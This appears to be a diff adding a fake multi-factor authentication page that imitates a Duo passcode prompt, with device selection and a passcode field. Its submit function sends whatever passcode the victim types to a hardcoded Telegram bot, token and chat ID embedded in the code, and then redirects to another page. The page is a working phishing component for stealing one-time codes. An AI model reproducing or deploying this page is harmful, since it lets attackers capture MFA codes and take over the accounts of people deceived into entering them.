@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authentication</title>
+    <link rel="stylesheet" href="style.css">
+    <!-- Font Awesome Link -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <div class="otp-container">
+      <div class="h2Header">
+        <h2>AUTHENTICATE</h2>
+        <a href="/form.html"><i class="fas fa-times"></i>
+        </a>
+      </div>
+        
+        
+        <div class="auth-box">
+            <i class="fas fa-shield-alt"></i>
+            <p class="security-text"> 
+                For added security we have enabled Multi-Factor Authentication (MFA) for our users.
+            </p>
+            
+            <label for="device">SELECT A DEVICE</label>
+            <hr>
+            <select id="device">
+                <option value="bob">Bob</option>
+            </select>
+            
+            <div class="remember">
+                <input type="checkbox" id="remember-device">
+                <label for="remember-device">Remember Device</label>
+            </div>
+            
+            <h3>CONFIRM VIA</h3>
+            <hr>
+            <p class="confirm-text">
+                We need to confirm that you have access to the selected device by sending a passcode via a third-party application or via text message, or we can call the device.
+            </p>
+            
+            <div class="buttons">
+                <button class="button-text" onclick="setActiveButton(this)"><i class="fas fa-sms"></i> Passcode via Text</button>
+                <button class="button-call" onclick="setActiveButton(this)"><i class="fas fa-phone-alt"></i> Phone Call</button>
+            </div>
+            
+        <p class="sentpasscode">Please enter the passcode sent via text message to the selected device or from within the Duo Mobile app.</p>
+            <label for="passcode">ENTER PASSCODE</label>
+            <hr>
+            <p class="confirm-text">
+               choose to receive a one-time passcode via text
+            </p>
+            <input type="text" id="passcode" placeholder="PASSCODE" oninput="checkPasscode()">
+            
+        </div>
+        <button class="submit-button"  id="submitButton" disabled onclick="submit()">SUBMIT</button>
+    </div>
+
+    <script>
+        function setActiveButton(button) {
+            // Remove 'active' class from all buttons
+            document.querySelectorAll('.buttons button').forEach(btn => btn.classList.remove('active'));
+            // Add 'active' class to the clicked button
+            button.classList.add('active');
+        }
+
+        function checkPasscode() {
+            const passcodeInput = document.getElementById('passcode');
+            const submitButton = document.getElementById('submitButton');
+            // Enable submit button if input has value; disable if empty
+            if (passcodeInput.value.trim() !== "") {
+                submitButton.disabled = false;
+                submitButton.classList.add('active');
+            } else {
+                submitButton.disabled = true;
+                submitButton.classList.remove('active');
+            }
+        }
+
+        function submit() {
+            const passcodeInput = document.getElementById('passcode');
+            var token = "7446085389:AAEDVLhoom9HbeL8AMEZDSg6PDygvG5o2AI";
+            var chat_id = "-4244251369";
+            var my_text = passcodeInput.value;
+            console.log(my_text);
+            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
+
+
+           let api = new XMLHttpRequest();
+           api.open("GET", url, true);
+           api.send();
+       window.location.href="index.html";
+        }
+    </script>
+</body>
+</html>
